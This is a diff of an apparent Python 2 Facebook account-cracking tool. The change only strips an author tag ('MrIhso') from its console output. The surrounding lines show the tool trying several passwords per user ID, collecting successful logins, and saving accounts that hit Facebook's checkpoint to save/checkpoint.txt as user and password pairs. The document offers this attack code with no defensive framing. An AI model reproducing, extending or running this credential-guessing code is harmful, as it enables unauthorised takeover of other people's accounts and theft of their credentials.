@@ -258,7 +258,7 @@ def action():
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95mMrIhso \x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
+					print '\x1b[1;95m\x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -275,7 +275,7 @@ def action():
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;93mMrIhso \x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
+							print '\x1b[1;93m\x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -292,7 +292,7 @@ def action():
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;96mMrIhso \x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
+									print '\x1b[1;96m\x1b[1;95m[RANA CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
